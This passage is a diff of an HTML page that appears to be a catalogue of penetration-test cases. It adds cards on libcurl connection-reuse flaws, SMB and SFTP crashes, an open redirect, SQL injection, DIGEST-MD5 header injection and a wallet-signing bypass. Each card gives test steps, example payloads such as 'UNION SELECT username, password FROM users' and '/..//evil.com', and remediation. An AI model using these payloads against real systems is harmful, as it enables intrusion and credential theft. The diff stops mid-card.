@@ -592,11 +592,11 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">212</div>
+        <div class="metric-value">271</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
-        <div class="metric-value">2026-03-10</div>
+        <div class="metric-value">2026-04-16</div>
       </div>
     </section>
 
@@ -604,7 +604,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>102</span></div>
+      <div class="analytics-label">Web App <span>123</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -612,25 +612,25 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>66</span></div>
+      <div class="analytics-label">Network <span>83</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:65%"></div>
+        <div class="analytics-bar-fill" style="width:67%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">API <span>22</span></div>
+      <div class="analytics-label">API <span>35</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:22%"></div>
+        <div class="analytics-bar-fill" style="width:28%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Source Code <span>16</span></div>
+      <div class="analytics-label">Source Code <span>24</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:16%"></div>
+        <div class="analytics-bar-fill" style="width:20%"></div>
       </div>
     </div>
     
@@ -638,7 +638,7 @@
     <div class="analytics-row">
       <div class="analytics-label">Other <span>3</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:3%"></div>
+        <div class="analytics-bar-fill" style="width:2%"></div>
       </div>
     </div>
     
@@ -676,11 +676,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (212)</option>
-          <option value="Web App">Web App (102)</option>
-<option value="Network">Network (66)</option>
-<option value="API">API (22)</option>
-<option value="Source Code">Source Code (16)</option>
+          <option value="all">All Categories (271)</option>
+          <option value="Web App">Web App (123)</option>
+<option value="Network">Network (83)</option>
+<option value="API">API (35)</option>
+<option value="Source Code">Source Code (24)</option>
 <option value="Other">Other (3)</option>
 <option value="Blockchain">Blockchain (1)</option>
 <option value="Desktop App">Desktop App (1)</option>
@@ -693,6 +693,1906 @@
 
     <section class="cards" id="cardContainer">
       
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">OAuth Bearer Token Mismatch via Connection Reuse</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Connection pooling within libcurl can lead to the reuse of HTTP connections across different API requests, potentially using incorrect OAuth bearer tokens. When a user authenticates with one token and then another user makes a request without forcing a new connection, the second request might be served on the first connection, inadvertently using the first user&#x27;s token. This can result in unauthorized access to resources or data belonging to the first user.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Authenticate with API using an OAuth bearer token: <code>curl -H &quot;Authorization: Bearer &lt;TOKEN<em>1&gt;&quot; &lt;TARGET</em>URL&gt;</code></li>
+<li>Establish a persistent TCP connection to the API endpoint.</li>
+<li>Authenticate with API using a different OAuth bearer token on the <em>same</em> easy handle without setting <code>CURLOPT<em>FRESH</em>CONNECT=1</code>: <code>curl -H &quot;Authorization: Bearer &lt;TOKEN<em>2&gt;&quot; &lt;TARGET</em>URL&gt;</code></li>
+<li>Observe that the second request is served on the first connection and uses the <code>Authorization: Bearer &lt;TOKEN_1&gt;</code> header.</li>
+<li>Verify that the API server processes the second request as if it were made by the user associated with <code>&lt;TOKEN_1&gt;</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to resources and data belonging to other users, potentially leading to data breaches, account takeover, or other security compromises.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that connections are refreshed when switching between OAuth bearer tokens on the same host. Developers should set <code>CURLOPT<em>FRESH</em>CONNECT=1</code> when switching tokens or explicitly reset the easy handle (<code>curl<em>easy</em>reset()</code>) to force a new connection for each request.  Structurally, ensure that OAuth bearer token changes always trigger a connection pool expiry for HTTP connections, irrespective of credential-per-request flags.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Proxy Connection Reuse with Mismatched Credentials</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when a network client library (like libcurl) reuses a proxy connection tunnel without properly validating the associated credentials. This can lead to a client bypassing authentication checks on a proxy server, potentially allowing unauthorized access. The core issue lies in the failure to match proxy credentials when reusing a tunnel, which is exacerbated in shared connection pool environments.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a proxy server.</li>
+<li>Build a test program that utilizes a client library (e.g., libcurl).</li>
+<li>Run the test program with a first transfer configured to use a proxy with valid credentials (e.g., &quot;good:good&quot;).</li>
+<li>Run a second transfer with the same program, but configure it to use a proxy with different, invalid credentials (e.g., &quot;bad:bad&quot;).</li>
+<li>Observe if the second transfer succeeds without proper authentication, reusing the tunnel established by the first transfer.</li>
+<li>Verify that the proxy server logs only one CONNECT request.</li>
+<li>Optionally, run a test simulating a multi-client wrapper/daemon service that reuses a shared connection pool to further validate the vulnerability.  This would involve multiple clients using the shared connection, with different credential configurations.</li>
+</ol>
+
+<p>Example Payload (within the test program, for setting proxy credentials):</p>
+<pre><code>--proxy-auth &quot;bad:bad&quot;</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker might be able to bypass proxy authentication checks, potentially gaining unauthorized access to resources behind the proxy. In multi-tenant architectures or shared services, this could allow a malicious client to impersonate another, authorized client.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that client libraries always validate proxy credentials before reusing a tunnel. Implement strict checks to guarantee that credentials used for a tunnel match the credentials presented during connection reuse.  Consider disabling connection sharing or strictly enforcing credential matching within connection sharing mechanisms. Use authentication protocols that tie authentication to the tunnel itself.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Heap Use-After-Free in SMB Connection Reuse</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a heap use-after-free error occurring when a network client rapidly processes multiple Server Message Block (SMB) URLs targeting the same host. The client&#x27;s library incorrectly manages memory associated with connection details, leading to a crash and potentially allowing for information disclosure or further memory corruption.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Build a network client library with SMB support and memory sanitization tools (e.g., AddressSanitizer - ASAN).</li>
+<li>Start a fake SMB server that responds without requiring authentication (for initial verification purposes).</li>
+<li>Execute a command that sends two SMB URLs to the same host using the built client library, specifying that output should be discarded.</li>
+<li>Monitor the execution for heap corruption errors reported by the memory sanitization tool.</li>
+<li>Use the following example command structure: <code>ASAN<em>OPTIONS=detect</em>leaks=0 LD<em>LIBRARY</em>PATH=./lib/.libs ./src/.libs/curl -u guest:guest &quot;smb://&lt;TARGET<em>IP&gt;:&lt;PORT&gt;/&lt;SHARE1&gt;/&lt;FILE1&gt;&quot; -o /dev/null &quot;smb://&lt;TARGET</em>IP&gt;:&lt;PORT&gt;/&lt;SHARE2&gt;/&lt;FILE2&gt;&quot; -o /dev/null</code></li>
+<li>Observe ASAN reports heap-use-after-free error in a function related to sending SMB open requests.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability results in a crash due to memory corruption, potentially leading to a denial-of-service (DoS) condition. In more severe cases, if the freed memory is reallocated with attacker-controlled data, information disclosure or further memory corruption could occur.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust memory management practices, particularly when dealing with connection reuse. This includes ensuring that shared resources are properly deallocated and that pointers referencing them are invalidated when the resources are released. Consider implementing connection pooling with explicit lifetime management and avoiding non-owning pointers to shared memory.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Remote Denial of Service (DoS) via Malformed SFTP QUOTE Command</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A flaw in the handling of SFTP QUOTE commands allows for a remote denial of service. Specifically, when processing a malformed QUOTE command containing trailing garbage, a NULL pointer dereference occurs, causing the application to crash. This vulnerability highlights a lack of proper error handling and memory management within the SFTP command parsing logic.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Ensure an SFTP server is running and accessible.</li>
+<li>Execute a command that sends a malformed SFTP QUOTE command containing trailing garbage to the server. For example:</li>
+</ol>
+<p><code>curl -k -u &lt;USER&gt;:&lt;PASSWORD&gt; sftp://&lt;TARGET<em>URL&gt; -Q &quot;mkdir /tmp/test trailing</em>garbage&quot;</code></p>
+<ol>
+<li>Observe that the application crashes with a segmentation fault. A core dump may be generated, depending on the system configuration.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability allows for a reliable remote denial of service. Any application utilizing the vulnerable library to process SFTP commands can be crashed, leading to service unavailability and disruption of critical operations.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement robust error handling during command parsing, ensuring all possible error conditions are handled and memory is properly freed. Carefully review the code paths for command processing to guarantee that all branches return correctly and prevent NULL pointer dereferences. Employ static analysis tools to identify potential NULL pointer dereference issues.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Open Redirect Bypass via Path Traversal</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An open redirect vulnerability exists where an attacker can bypass filtering mechanisms designed to prevent redirection to arbitrary external domains. This bypass is achieved through path traversal sequences combined with double slashes in the redirect parameter, allowing an authenticated user to be silently redirected to a malicious site. This poses a significant risk as authenticated users may trust the original domain and be susceptible to phishing attacks.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create or log in to an existing account on &lt;TARGET_URL&gt;.</li>
+<li>Navigate to the following URL while authenticated: &lt;TARGET<em>URL&gt;/auth/post-login?redirect=/..//&lt;MALICIOUS</em>DOMAIN&gt;</li>
+<li>Observe that you are redirected to &lt;MALICIOUS_DOMAIN&gt;.</li>
+<li>Example Payload: <code>/..//evil.com</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can redirect authenticated users to arbitrary external websites, potentially leading to phishing attacks, credential theft, or redirection to malicious content. The fact that the redirect occurs after login increases the credibility of the attack.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement a robust allowlist or URL parser validation for redirect URLs. Avoid using denylists, as they can be easily bypassed with creative encoding or path traversal techniques. Always validate and sanitize user-provided input and normalize URLs before processing them.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Custom URL Scheme Validation Bypass</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The custom URL scheme validation function has a flaw that allows schemes with invalid characters in the final position to pass validation. This bypasses input validation, potentially leading to security vulnerabilities in applications that rely on this validation.  This deviates from standard URL scheme rules defined in RFC 3986.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Compile and run the following C program:</li>
+</ol>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;curl/curl.h&gt;
+
+int main(void) {
+  CURLU *url;
+  CURLUcode rc;
+  const char *schemes[] = {&quot;bad!&quot;, &quot;bad{&quot;, &quot;bad/&quot;, &quot;a!&quot;, NULL};
+
+  for(int i = 0; schemes[i]; i++) {
+    url = curl_url();
+    rc = curl_url_set(url, CURLUPART_SCHEME, schemes[i],
+                      CURLU_NON_SUPPORT_SCHEME);
+    char *out = NULL;
+    if(rc == CURLUE_OK)
+      curl_url_get(url, CURLUPART_SCHEME, &amp;out, 0);
+    printf(&quot;%-10s  %s&quot;, schemes[i],
+           rc == CURLUE_OK ? &quot;ACCEPTED (BUG!)&quot; : &quot;REJECTED (correct)&quot;);
+    if(out) { printf(&quot;  stored=&#x27;%s&#x27;&quot;, out); curl_free(out); }
+    printf(&quot;\n&quot;);
+    curl_url_cleanup(url);
+  }
+  return 0;
+}</code></pre>
+<ol>
+<li>Observe that schemes ending with an invalid character (e.g., &quot;bad!&quot;, &quot;bad{&quot;, &quot;bad/&quot;) are &quot;ACCEPTED&quot; instead of &quot;REJECTED.&quot;</li>
+<li>Verify that the scheme is stored using the <code>curl<em>url</em>get</code> function with CURLUPART_SCHEME.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An input validation bypass allows for potentially malicious URLs to be processed, bypassing security filters and potentially leading to SSRF (Server-Side Request Forgery) or other vulnerabilities.  This violates URL formatting standards and could lead to unpredictable behavior in applications relying on strict URL validation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter input validation for custom URL schemes.  Ensure that the scheme validation function adheres to RFC 3986 Section 3.1, and validates the last character of the scheme. Sanitize user input and apply proper encoding to prevent malicious characters from being included in the URL scheme.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Improper Handling of Comma-Separated HTTP Header Values</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from an incorrect parsing of HTTP header values, specifically those containing comma-separated tokens. The application fails to process all tokens within the header, potentially leading to unintended behavior and exposing sensitive information. This flaw can be exploited to manipulate connection handling and intercept subsequent requests.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send an HTTP request with a <code>Connection</code> header containing multiple comma-separated tokens. For example, the header <code>Connection: upgrade, close</code> or <code>Connection: keep-alive, close</code>.</li>
+<li>Observe the application&#x27;s response to the initial request.</li>
+<li>Send a subsequent HTTP request to the same host and port.</li>
+<li>Monitor the network traffic to determine whether the request includes sensitive data like authentication credentials that were not intended to be sent.</li>
+<li>Example payload: <code>Connection: upgrade, close</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can exploit this to intercept sensitive data from subsequent requests by manipulating connection handling. This can lead to credential theft, session hijacking, or unauthorized data access.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that header parsing logic correctly handles comma-separated values by iterating through all tokens in the header and processing them accordingly. Validate and properly handle all connection directives in HTTP headers.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SQL Injection via &lt;PARAMETER&gt;</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A SQL injection vulnerability exists, allowing an attacker to manipulate database queries by injecting malicious SQL code. This can lead to unauthorized data access, modification, or deletion, potentially compromising the integrity and confidentiality of the entire database. Improper input validation on user-supplied data is the likely cause.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the vulnerable endpoint: &lt;TARGET_URL&gt;.</li>
+<li>Locate a parameter that accepts user input, denoted as &lt;PARAMETER&gt;.</li>
+<li>Inject the following SQL payload into the &lt;PARAMETER&gt; field: <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code>.</li>
+<li>Observe the response.  If the application does not properly sanitize the input, the query will be altered and could potentially return all records from a table.</li>
+<li>Attempt to extract specific data by modifying the payload, for example: <code>&#x27; UNION SELECT username, password FROM users --</code>.</li>
+<li>Verify that the injection is successful by observing the altered query results or the execution of malicious commands.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this SQL injection vulnerability could allow an attacker to retrieve sensitive data, modify data, execute arbitrary code on the database server, or even gain complete control of the database, potentially leading to a complete compromise of the application and its data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement parameterized queries or prepared statements to prevent SQL injection. Always validate and sanitize user-supplied input before using it in database queries. Utilize a Web Application Firewall (WAF) to detect and block malicious SQL injection attempts.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Authorization Bypass via Parameter Manipulation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where a user&#x27;s authorization can be bypassed through manipulation of a parameter controlling confirmation dialogs for transaction signing. This allows a malicious website to initiate transactions or sign messages without the user&#x27;s explicit consent, potentially leading to unauthorized actions and asset compromise. The core issue is that a parameter intended to control confirmation behavior can be externally influenced, circumventing security measures.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Install a cryptocurrency wallet browser extension.</li>
+<li>Install a Starknet Snap extension within the cryptocurrency wallet browser extension.</li>
+<li>Obtain an HTML file (similar to &quot;exp-starknet.html&quot;) that contains malicious code designed to trigger transaction signing.</li>
+<li>Host the HTML file on a local web server (e.g., using Python&#x27;s <code>http.server</code>).</li>
+<li>Navigate to the URL of the hosted HTML file using a web browser.</li>
+<li>Interact with elements within the HTML file that trigger a request to the Starknet Snap, ensuring a parameter (e.g., <code>enableAuthorize</code>) is set to <code>false</code> to bypass the confirmation dialog.</li>
+<li>Observe whether the transaction signing process proceeds without a user confirmation prompt. A crafted payload might look like: <code>enableAuthorize=false&amp;typedDataMessage=&lt;typed<em>data</em>payload&gt;&amp;address=&lt;account_address&gt;</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized transactions can be signed on behalf of the user without their knowledge or consent. This can lead to the theft of assets, unauthorized modifications to smart contracts, or other malicious activities controlled by the attacker.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Parameters controlling authorization flows should be designed to be immutable and resistant to external manipulation. Default to requiring user confirmation for all signing operations and ensure that any options to bypass this confirmation are strictly controlled and audited. Implement robust input validation and sanitization to prevent parameter tampering.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">SMB READ_ANDX DataOffset Boundary Violation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from insufficient validation of the <code>DataOffset</code> field in a <code>READ_ANDX</code> SMB response. A malicious server can set the <code>DataOffset</code> to a value that bypasses bounds checks, leading the client to read arbitrary data from the receive buffer as if it were file data. This enables the server to inject controlled data into the application&#x27;s processing pipeline, potentially compromising security or integrity.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Establish an SMB connection to a server capable of responding with a <code>READ_ANDX</code> request.</li>
+<li>Configure the server to respond with a <code>READ_ANDX</code> request that sets the <code>DataOffset</code> field to <code>0x0000</code> and the <code>DataLength</code> field to a value (N) less than or equal to the receive buffer size minus 5, such as <code>0x001c</code> (28).</li>
+<li>Initiate a file transfer using a client like <code>curl smb://&lt;TARGET_URL&gt;/share/file --user &lt;USER&gt;:&lt;PASSWORD&gt; -o output.bin</code>.</li>
+<li>Examine the contents of the downloaded <code>output.bin</code> file. It should contain data from the beginning of the receive buffer (e.g., SMB magic bytes, session header fields) instead of the expected file data.</li>
+<li>Verify that the client reports a successful transfer (exit code 0).</li>
+<li>Repeat the test, varying the <code>DataOffset</code> and <code>DataLength</code> values to explore the range of bypassable bounds checks.</li>
+<li>Example Payload: <code>DataOffset = 0x0000</code> and <code>DataLength = 0x001c</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can inject arbitrary data into the application&#x27;s data processing pipeline, potentially leading to information disclosure (e.g., revealing SMB session keys), unauthorized code execution, or denial of service. This bypasses security checks and can result in complete compromise without indication of failure.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement a robust lower bound check on the <code>DataOffset</code> field within the client-side SMB parsing logic. Ensure that <code>DataOffset</code> points to a valid location past all header and parameter words in the SMB response, adhering to the SMB protocol specifications. This check should prevent the client from reading arbitrary data from the receive buffer based on attacker-controlled offsets.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Business Logic Bypass: Unauthorized Role Assignment</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A business logic flaw allows users to manipulate invitation links to assign restricted roles, bypassing subscription requirements. This enables free plan users to gain access to features intended only for paying subscribers, potentially leading to unauthorized functionality usage and undermining revenue models.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create two accounts: one as a project owner and another as a user to be invited.</li>
+<li>From the owner account, create a project and select a template.</li>
+<li>During the invitation process, intercept the network request used to generate the invitation link.</li>
+<li>Modify the <code>access_level</code> parameter within the intercepted request from <code>write</code> to <code>read</code>. This parameter controls the role assigned to the invited user.</li>
+<li>Forward the modified request and observe the server&#x27;s response.</li>
+<li>Verify that the invitation successfully grants the <code>read</code> role, despite the account being on a free plan.</li>
+<li>Accept the invitation using the second account and verify the granted access role.</li>
+</ol>
+
+<p>Example Payload:</p>
+<pre><code>{&quot;access_level&quot;:&quot;read&quot;}</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to premium features, potential loss of revenue for the platform due to subscription bypass, and undermined business logic enforcement.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust server-side validation to ensure that users are granted only the roles and permissions that align with their subscription plan.  Thoroughly sanitize and validate all input parameters within invitation generation processes, and utilize secure coding practices to prevent manipulation of access levels.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Username Injection in DIGEST-MD5 Authentication</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The DIGEST-MD5 authentication mechanism constructs the Authorization header by incorporating the username. Failure to properly escape special characters (like double quotes and backslashes) within the username can lead to injection vulnerabilities within the generated header. This injection can potentially compromise authentication and lead to unauthorized access.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send an authentication request using DIGEST-MD5 with a crafted username containing special characters.</li>
+<li>Use the following payload for the username: <code>&quot;admin&quot;test</code>. The double quotes and backslash will attempt to break out of the intended username string.</li>
+<li>Example command using <code>curl</code>: <code>curl -s --max-time 2 --digest --user &#x27;admin&quot;test:pass&#x27; &lt;TARGET_URL&gt;</code></li>
+<li>Another example: Send an authentication request using DIGEST-MD5 with a crafted username containing special characters.</li>
+<li>Use the following payload for the username: <code>admin\&quot;,realm=&quot;evil.com:pass</code>. The double quotes and backslash will attempt to inject a crafted realm value into the authentication response.</li>
+<li>Example command using <code>curl</code>: <code>curl -s --max-time 2 imap://&lt;TARGET_URL&gt; --user &quot;admin\&quot;,realm=&quot;evil.com:pass&quot; --login-options &quot;AUTH=DIGEST-MD5&quot;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  Successful injection can lead to unauthorized access to protected resources or the ability to manipulate the authentication process, potentially enabling attackers to impersonate legitimate users or gain control over the server.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement proper input validation and output escaping when constructing the Authorization header. Ensure that special characters in usernames are escaped before inclusion in the header string to prevent injection vulnerabilities. Utilize parameterized authentication methods where possible to avoid manual string concatenation.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">HSTS Persistence via HTTPS Proxy for HTTP Origin</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A client library incorrectly persists HSTS (HTTP Strict Transport Security) settings from a website accessed via an HTTPS proxy, even when the initial connection was made over HTTP. This can lead to unintended HTTPS upgrades for subsequent HTTP requests to the same domain, potentially bypassing intended security measures or causing unexpected behavior for users.  The HSTS policy learned from the HTTP origin is unintentionally applied due to the HTTPS proxy connection.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Establish an HTTPS proxy connection (e.g., <code>https://&lt;PROXY<em>ADDRESS&gt;:&lt;PROXY</em>PORT&gt;</code>).</li>
+<li>Send an initial HTTP request to a target origin using the proxy, preserving the HSTS cache file (e.g., <code>--hsts &lt;CACHE_FILE&gt;</code>). The origin should respond with an HSTS header (e.g., <code>Strict-Transport-Security: max-age=&lt;DURATION&gt;</code>).</li>
+<li>Send a subsequent HTTP request to the same target origin via the proxy, again using the preserved HSTS cache file.</li>
+<li>Observe the client&#x27;s behavior; it should automatically upgrade the HTTP request to HTTPS and attempt a connection to <code>https://&lt;TARGET_ORIGIN&gt;:&lt;PORT&gt;</code>.</li>
+</ol>
+<pre><code>curl -v \
+  --proxy https://&lt;PROXY_ADDRESS&gt;:&lt;PROXY_PORT&gt; --proxy-insecure \
+  --hsts &lt;CACHE_FILE&gt; \
+  http://&lt;TARGET_ORIGIN&gt;:&lt;PORT&gt;/</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Automatic and unintended upgrades to HTTPS can expose users to unnecessary network overhead or potential interception by malicious actors if the HTTPS connection is compromised. Additionally, it can bypass intended HTTP-only functionality or introduce unexpected behavior due to the enforced HTTPS protocol.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> The client library should differentiate between connections established directly to an origin and connections proxied through an HTTPS endpoint. HSTS policies learned over HTTPS proxy connections should not be persisted or applied to subsequent HTTP requests to the origin. Implement stricter validation of the origin when establishing HSTS policies.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unvalidated Reward Redemption Allows for Multiple Licenses</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The reward redemption process lacks proper validation, allowing users to obtain multiple rewards by submitting the form with different email addresses. This can lead to the unauthorized acquisition of valuable licenses or rewards, negatively impacting the program&#x27;s budget and potentially creating unfair advantages.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the reward redemption page.</li>
+<li>Submit the redemption form using one email address and obtain a reward.</li>
+<li>Submit the redemption form again using a different email address.</li>
+<li>Verify if a second reward (license) is successfully issued.</li>
+<li>Repeat steps 2-3 with multiple email addresses to determine the extent of the abuse.</li>
+<li>Example payload for email field: &lt;test@example.com&gt;</li>
+</ol>
+
